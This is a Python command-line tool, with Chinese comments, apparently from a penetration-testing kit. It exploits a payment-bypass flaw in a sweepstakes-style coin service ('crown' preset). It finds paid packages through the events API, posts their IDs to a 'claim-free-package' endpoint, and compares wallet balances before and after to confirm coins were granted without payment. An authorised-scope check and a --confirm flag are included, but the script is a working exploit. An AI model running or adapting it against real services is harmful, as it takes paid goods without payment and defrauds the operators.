#!/usr/bin/env python3
"""免费领取付费礼包绕过：discover / probe / claim / wallet。

对齐 Playbook：传承/秦百胜·魂压.md
参考：docs/references/报告-CrownCoins-claim-free-package.md

示例:
  python3 炼蛊房/free_claim_bypass.py discover \\
    --api https://api.授权 --token "$TOKEN" --case <案卷> --preset crown
"""
from __future__ import annotations

import argparse
import json
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, UTC
from pathlib import Path
from typing import Any

OPS = Path(__file__).resolve().parent
ENGINE = (OPS.parent if (OPS.parent / "杀招").is_dir() else (OPS.parent if (OPS.parent / "杀招").is_dir() else OPS.parents[1]))
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))

from scope_lib import host_of, in_scope  # noqa: E402

UA = "Mozilla/5.0 大爱仙尊-free_claim_bypass"

PRESETS: dict[str, dict[str, str]] = {
    "crown": {
        "events_path": "/v2/event-trigger/events",
        "claim_path": "/v2/offers/rolling-offers/claim-free-package",
        "wallet_path": "/v2/user/get-wallet",
        "events_method": "POST",
        "claim_method": "POST",
        "wallet_method": "GET",
    },
    "generic": {
        "events_path": "/v2/event-trigger/events",
        "claim_path": "/v2/offers/rolling-offers/claim-free-package",
        "wallet_path": "/v2/user/get-wallet",
        "events_method": "POST",
        "claim_method": "POST",
        "wallet_method": "GET",
    },
}

# 发现阶段额外探测的 claim 候选（相对 API root）
CLAIM_CANDIDATES = (
    "/v2/offers/rolling-offers/claim-free-package",
    "/v2/offers/claim-free-package",
    "/v1/offers/claim-free-package",
    "/api/offers/claim-free-package",
    "/api/v2/offers/rolling-offers/claim-free-package",
    "/offers/claim-free",
    "/api/bonus/claim-free",
    "/api/packages/claim-free",
)



def _ssl_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _now() -> str:
    return datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%SZ")


def case_dir(case: str) -> Path:
    d = ENGINE / "案卷" / case / "测绘" / "free_claim"
    d.mkdir(parents=True, exist_ok=True)
    return d


def ensure_scope(url: str) -> None:
    h = host_of(url)
    if h in ("127.0.0.1", "localhost", "::1"):
        return
    if not in_scope(h):
        raise SystemExit(f"[scope] {h} 不在授权范围，拒绝请求")


def ssl_ctx(insecure: bool) -> ssl.SSLContext:
    return ssl._create_unverified_context() if insecure else ssl.create_default_context()


def http_json(
    url: str,
    *,
    method: str = "GET",
    token: str = "",
    body: Any = None,
    insecure: bool = False,
    timeout: int = 30,
) -> dict[str, Any]:
    data = None
    hdrs = {
        "User-Agent": UA,
        "Accept": "application/json,*/*",
    }
    if token:
        hdrs["Authorization"] = token if token.lower().startswith("bearer ") else f"Bearer {token}"
    if body is not None:
        data = json.dumps(body).encode("utf-8")
        hdrs["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, headers=hdrs, method=method.upper())
    try:
        with urllib.request.urlopen(req, context=ssl_ctx(insecure), timeout=timeout) as r:
            raw = r.read()[:3_000_000]
            text = raw.decode("utf-8", "replace")
            try:
                j = json.loads(text) if text else None
            except Exception:
                j = None
            return {"status": r.status, "len": len(raw), "json": j, "body": text, "error": None}
    except urllib.error.HTTPError as e:
        raw = e.read()[:1_000_000] if e.fp else b""
        text = raw.decode("utf-8", "replace")
        try:
            j = json.loads(text) if text else None
        except Exception:
            j = None
        return {"status": e.code, "len": len(raw), "json": j, "body": text, "error": f"HTTP {e.code}"}
    except Exception as e:
        return {"status": 0, "len": 0, "json": None, "body": "", "error": str(e)}


def resolve_paths(args: argparse.Namespace) -> dict[str, str]:
    preset = PRESETS.get(args.preset or "generic", PRESETS["generic"]).copy()
    if getattr(args, "events_path", None):
        preset["events_path"] = args.events_path
    if getattr(args, "claim_path", None):
        preset["claim_path"] = args.claim_path
    if getattr(args, "wallet_path", None):
        preset["wallet_path"] = args.wallet_path
    return preset


def _as_list(x: Any) -> list:
    if x is None:
        return []
    if isinstance(x, list):
        return x
    return [x]


def _price_of(pkg: dict) -> float | None:
    for k in ("price", "packagePrice", "amount", "usdPrice", "cost", "fiatPrice"):
        if k in pkg and pkg[k] is not None:
            try:
                return float(pkg[k])
            except Exception:
                pass
    return None


def _pkg_id(pkg: dict) -> Any:
    for k in ("packageId", "package_id", "id", "offerId", "skuId"):
        if k in pkg and pkg[k] is not None:
            return pkg[k]
    return None


def walk_packages(obj: Any, path: str = "$") -> list[dict[str, Any]]:
    """递归找出带 price/packageId 特征的对象。"""
    found: list[dict[str, Any]] = []
    if isinstance(obj, dict):
        looks_pkg = any(k in obj for k in ("price", "packageId", "package_id", "scCoin", "gcCoin", "goldCoin"))
        if looks_pkg and (_pkg_id(obj) is not None or _price_of(obj) is not None):
            found.append({"path": path, "package": obj, "package_id": _pkg_id(obj), "price": _price_of(obj)})
        for k, v in obj.items():
            found.extend(walk_packages(v, f"{path}.{k}"))
    elif isinstance(obj, list):
        for i, v in enumerate(obj[:500]):
            found.extend(walk_packages(v, f"{path}[{i}]"))
    return found


def extract_active_events(payload: Any) -> list[dict[str, Any]]:
    """尽量抽出 activeEvent / events 列表。"""
    events: list[dict[str, Any]] = []
    if not isinstance(payload, (dict, list)):
        return events

    def consider(ev: Any) -> None:
        if isinstance(ev, dict) and (ev.get("packages") or ev.get("activeEvent") or "eventTriggerId" in ev or "userEventTriggerId" in ev):
            if "activeEvent" in ev and isinstance(ev["activeEvent"], dict):
                events.append(ev if "userEventTriggerId" in ev or "eventTriggerId" in ev else {"activeEvent": ev["activeEvent"], **{k: ev.get(k) for k in ev}})
            else:
                events.append(ev)

    if isinstance(payload, list):
        for x in payload:
            consider(x)
        return events

    for key in ("data", "events", "activeEvents", "result", "items"):
        if key in payload:
            for x in _as_list(payload[key]):
                consider(x)
                if isinstance(x, dict) and isinstance(x.get("activeEvent"), dict):
                    events.append(x)
    # 根就是 event
    consider(payload)
    # 去重粗暴：按 json 长度+eventTriggerId
    uniq = []
    seen = set()
    for e in events:
        ae = e.get("activeEvent") if isinstance(e.get("activeEvent"), dict) else e
        eid = str(e.get("eventTriggerId") or e.get("userEventTriggerId") or (ae or {}).get("id") or "")
        sig = eid + ":" + str(len(json.dumps(e, default=str)))
        if sig in seen:
            continue
        seen.add(sig)
        uniq.append(e)
    return uniq


def build_claim_body(event_wrap: dict, package_id: Any) -> dict[str, Any]:
    ae = event_wrap.get("activeEvent") if isinstance(event_wrap.get("activeEvent"), dict) else event_wrap
    body: dict[str, Any] = {
        "activeEvent": ae,
        "packageId": package_id,
    }
    for k in ("userEventTriggerId", "eventTriggerId"):
        if event_wrap.get(k) is not None:
            body[k] = event_wrap[k]
        elif isinstance(ae, dict) and ae.get(k) is not None:
            body[k] = ae[k]
    return body


def cmd_discover(args: argparse.Namespace) -> int:
    api = args.api.rstrip("/")
    ensure_scope(api)
    paths = resolve_paths(args)
    out = case_dir(args.case)

    events_url = api + paths["events_path"]
    method = paths.get("events_method", "POST")
    body: Any = {} if method.upper() == "POST" else None
    r = http_json(events_url, method=method, token=args.token, body=body, insecure=args.insecure, timeout=args.timeout)
    (out / "events_raw.json").write_text(
        json.dumps({"ts": _now(), "url": events_url, "status": r["status"], "json": r["json"], "body_head": (r["body"] or "")[:2000]}, ensure_ascii=False, indent=2) + "\n",
        encoding="utf-8",
    )

    packages = walk_packages(r["json"])
    paid = [p for p in packages if p.get("price") is not None and float(p["price"]) > 0]
    free = [p for p in packages if p.get("price") == 0]
    events = extract_active_events(r["json"])

    # OPTIONS/探测 claim 候选是否存在（不领取）
    claim_hits = []
    for cp in dict.fromkeys([paths["claim_path"], *CLAIM_CANDIDATES]):
        url = api + cp
        # 用空 body POST，看是否 404 路由不存在
        rr = http_json(url, method="POST", token=args.token, body={}, insecure=args.insecure, timeout=min(15, args.timeout))
        exists = rr["status"] not in (0, 404, 405)
        # 401/400/422/500 都说明路由可能在
        if exists or rr["status"] in (400, 401, 403, 422, 500):
            claim_hits.append({"path": cp, "status": rr["status"], "head": (rr["body"] or "")[:160]})
            print(f"  [route?] {cp} status={rr['status']}")

    report = {
        "ts": _now(),
        "api": api,
        "events_path": paths["events_path"],
        "events_status": r["status"],
        "package_count": len(packages),
        "paid_packages": [
            {
                "package_id": p["package_id"],
                "price": p["price"],
                "path": p["path"],
                "preview": {k: p["package"].get(k) for k in list(p["package"].keys())[:12]},
            }
            for p in paid
        ],
        "free_package_count": len(free),
        "active_event_wraps": len(events),
        "claim_route_candidates": claim_hits,
        "vuln_hypothesis": bool(paid) and bool(claim_hits),
        "note": "paid_packages + claim-free 路由并存 → 优先 probe；price=0 欢迎礼不是洞",
    }
    path = out / "discover.json"
    path.write_text(json.dumps(report, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    # 缓存 events 供 probe/claim
    (out / "events_wraps.json").write_text(json.dumps(events, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")

    print(f"[ok] packages={len(packages)} paid={len(paid)} free={len(free)} events={len(events)} -> {path}")
    for p in paid[:20]:
        print(f"  PAID id={p['package_id']} price={p['price']} @ {p['path']}")
    if report["vuln_hypothesis"]:
        print("[next] probe --package-id <付费id>  （确认后再 claim --confirm）")
    return 0 if r["status"] else 2


def _load_event_wrap(args: argparse.Namespace, out: Path) -> dict[str, Any]:
    if args.event_file:
        return json.loads(Path(args.event_file).read_text(encoding="utf-8"))
    wraps_path = out / "events_wraps.json"
    if wraps_path.is_file():
        wraps = json.loads(wraps_path.read_text(encoding="utf-8"))
        if isinstance(wraps, list) and wraps:
            # 选含目标 packageId 的
            pid = args.package_id
            for w in wraps:
                pkgs = walk_packages(w)
                if any(str(p.get("package_id")) == str(pid) for p in pkgs):
                    return w
            return wraps[0]
    raise SystemExit("[!] 无 activeEvent：先 discover 或 --event-file")


def cmd_wallet(args: argparse.Namespace) -> int:
    api = args.api.rstrip("/")
    ensure_scope(api)
    paths = resolve_paths(args)
    out = case_dir(args.case)
    url = api + paths["wallet_path"]
    r = http_json(url, method=paths.get("wallet_method", "GET"), token=args.token, insecure=args.insecure, timeout=args.timeout)
    path = out / "wallet.json"
    path.write_text(json.dumps({"ts": _now(), "url": url, "resp": r}, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    print(f"[wallet] status={r['status']} -> {path}")
    print((r.get("body") or "")[:400])
    return 0 if r["status"] == 200 else 2


def cmd_probe(args: argparse.Namespace) -> int:
    """对付费 packageId 调 claim-free；记录响应。默认就是发真实请求（业务上可能已领），命名 probe=验证逻辑。"""
    api = args.api.rstrip("/")
    ensure_scope(api)
    paths = resolve_paths(args)
    out = case_dir(args.case)
    wrap = _load_event_wrap(args, out)
    body = build_claim_body(wrap, args.package_id)
    # 标价提示
    priced = [p for p in walk_packages(wrap) if str(p.get("package_id")) == str(args.package_id)]
    price = priced[0]["price"] if priced else None
    if price is not None and float(price) <= 0:
        print(f"[warn] packageId={args.package_id} price={price} — 可能是合法免费包，不是漏洞目标")
    elif price is not None:
        print(f"[target] packageId={args.package_id} price={price} (>0 才是手法目标)")

    before = http_json(api + paths["wallet_path"], method=paths.get("wallet_method", "GET"), token=args.token, insecure=args.insecure, timeout=args.timeout)
    url = api + paths["claim_path"]
    r = http_json(url, method=paths.get("claim_method", "POST"), token=args.token, body=body, insecure=args.insecure, timeout=args.timeout)
    after = http_json(api + paths["wallet_path"], method=paths.get("wallet_method", "GET"), token=args.token, insecure=args.insecure, timeout=args.timeout)

    interesting = r["status"] in (200, 201) and not _biz_denied(r)
    report = {
        "ts": _now(),
        "mode": "probe",
        "api": api,
        "claim_path": paths["claim_path"],
        "package_id": args.package_id,
        "price": price,
        "request_body_keys": list(body.keys()),
        "claim": {"status": r["status"], "json": r["json"], "head": (r["body"] or "")[:800]},
        "wallet_before": before.get("json"),
        "wallet_after": after.get("json"),
        "interesting": interesting,
        "note": "interesting=HTTP成功且非明确拒绝；仍需人工区分欢迎礼/已领过",
    }
    path = out / f"probe_{args.package_id}.json"
    path.write_text(json.dumps(report, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    (out / f"claim_body_{args.package_id}.json").write_text(json.dumps(body, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    flag = "HIT?" if interesting else "deny"
    print(f"[{flag}] claim status={r['status']} price={price} -> {path}")
    print((r.get("body") or "")[:300])
    return 0 if interesting else 2


def _biz_denied(r: dict[str, Any]) -> bool:
    b = ((r.get("body") or "") + json.dumps(r.get("json") or {})).lower()
    keys = ("must purchase", "not free", "payment required", "price", "cannot claim", "already claimed", "unauthorized", "forbidden")
    # 弱启发式：明确支付/非免费
    if any(x in b for x in ("must purchase", "not free", "payment required", "cannot claim package with price")):
        return True
    if r.get("status") in (401, 403, 402, 422):
        # 422 可能是参数错也可能是拒领
        return True
    return False


def cmd_claim(args: argparse.Namespace) -> int:
    if not args.confirm:
        raise SystemExit("[!] claim 会改变余额/权益。确认后加 --confirm（且目标须在授权范围）")
    # 复用 probe 逻辑但标记 mode=claim
    args_mode = argparse.Namespace(**vars(args))
    rc = cmd_probe(args_mode)
    out = case_dir(args.case)
    src = out / f"probe_{args.package_id}.json"
    if src.is_file():
        data = json.loads(src.read_text(encoding="utf-8"))
        data["mode"] = "claim"
        data["confirmed"] = True
        (out / f"claim_{args.package_id}.json").write_text(json.dumps(data, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
        print(f"[ok] claim evidence -> claim_{args.package_id}.json")
    return rc


def main() -> int:
    ap = argparse.ArgumentParser(description="免费领取付费礼包绕过")
    sub = ap.add_subparsers(dest="cmd", required=True)

    def add_common(p: argparse.ArgumentParser) -> None:
        p.add_argument("--api", required=True, help="API root，如 https://api.example.com")
        p.add_argument("--token", required=True, help="Bearer Token（可带或不带 Bearer 前缀）")
        p.add_argument("--case", required=True)
        p.add_argument("--preset", default="crown", choices=sorted(PRESETS.keys()))
        p.add_argument("--events-path", default="")
        p.add_argument("--claim-path", default="")
        p.add_argument("--wallet-path", default="")
        p.add_argument("--insecure", action="store_true")
        p.add_argument("--timeout", type=int, default=30)

    p = sub.add_parser("discover", help="拉活动/礼包，列出 price>0 + claim 路由候选")
    add_common(p)
    p.set_defaults(func=cmd_discover)

    p = sub.add_parser("wallet", help="读取钱包")
    add_common(p)
    p.set_defaults(func=cmd_wallet)

    p = sub.add_parser("probe", help="对付费 packageId 调 free-claim 并对比钱包")
    add_common(p)
    p.add_argument("--package-id", required=True)
    p.add_argument("--event-file", default="", help="可选：手工 activeEvent 包装 JSON")
    p.set_defaults(func=cmd_probe)

    p = sub.add_parser("claim", help="同 probe，但要求 --confirm（改余额）")
    add_common(p)
    p.add_argument("--package-id", required=True)
    p.add_argument("--event-file", default="")
    p.add_argument("--confirm", action="store_true")
    p.set_defaults(func=cmd_claim)

    args = ap.parse_args()
    return int(args.func(args) or 0)


if __name__ == "__main__":
    raise SystemExit(main())
